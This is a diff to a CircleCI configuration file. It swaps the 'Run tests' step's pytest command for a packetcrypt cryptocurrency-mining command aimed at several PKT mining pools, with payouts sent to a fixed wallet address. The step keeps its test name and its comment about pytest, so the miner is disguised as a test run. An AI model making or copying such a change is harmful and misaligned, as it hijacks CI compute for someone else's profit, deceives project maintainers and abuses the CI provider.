@@ -36,7 +36,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command: pytest
+          command: ./target/release/packetcrypt ann https://stratum.zetahash.com/ http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com --paymentaddr pkt1q6lgawhlctxwuaz640gr46483st62dl84wckafm
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
